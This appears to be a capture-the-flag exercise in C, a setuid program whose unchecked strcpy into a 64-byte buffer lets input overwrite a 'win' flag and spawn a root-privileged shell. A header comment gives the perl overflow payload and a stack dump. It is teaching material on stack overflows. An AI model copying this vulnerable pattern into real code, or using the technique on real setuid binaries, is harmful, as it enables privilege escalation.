/*
** Solution
** ./simple_overwrite $( perl -e 'print "A"x64 . "\x01" ' )
** 
** Stack dump:
** 0xffffd614: 0xffffd80f (second argument)
** 0xffffd610: 0x00000000 (first argument)
** 0xffffd60c: 0x0804870f (saved eip)
** 0xffffd608: 0xffffd638 (saved ebp)
** 0xffffd604: 0xf7fcbff4
** 0xffffd600: 0x000015d1
** 0xffffd5fc: 0x00000001
** 0xffffd5f8: 0x41414141
** 0xffffd5f4: 0x41414141
** 0xffffd5f0: 0x41414141
** 0xffffd5ec: 0x41414141
** 0xffffd5e8: 0x41414141
** 0xffffd5e4: 0x41414141
** 0xffffd5e0: 0x41414141
** 0xffffd5dc: 0x41414141
** 0xffffd5d8: 0x41414141
** 0xffffd5d4: 0x41414141
** 0xffffd5d0: 0x41414141
** 0xffffd5cc: 0x41414141
** 0xffffd5c8: 0x41414141
** 0xffffd5c4: 0x41414141
** 0xffffd5c0: 0x41414141
** 0xffffd5bc: 0x41414141 (beginning of buffer)

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

void vuln(int tmp, char *str) {
    int win = tmp;
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 23, (void **) &tmp);
    printf("win = %d\n", win);
    if (win == 1) {
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("Sorry, you lose.\n");
    }
    exit(0);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: stack_overwrite [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(0, argv[1]);
    return 0;
}
